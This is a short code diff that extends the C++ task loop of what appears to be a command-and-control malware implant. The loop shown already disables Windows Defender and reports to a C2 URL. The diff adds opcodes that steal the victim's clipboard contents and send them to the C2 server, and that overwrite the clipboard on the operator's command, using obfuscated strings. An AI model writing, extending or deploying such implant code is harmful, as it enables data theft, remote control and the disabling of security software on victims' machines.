@@ -270,5 +270,19 @@ int main()
 			BOOL result = DisableDefender();
 			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", result != FALSE, currentProfile);
 		}
+		else if (opcode == OPCODE_CLIPBOARD_GET)
+		{
+			std::string result = GetClipboard();
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_CLIPBOARD_SET)
+		{
+			std::string result = SetClipboard(newTask->args->GetString());
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else
+		{
+			DEBUG_PRINTF("Invalid opcode\n");
+		}
 	}
 }
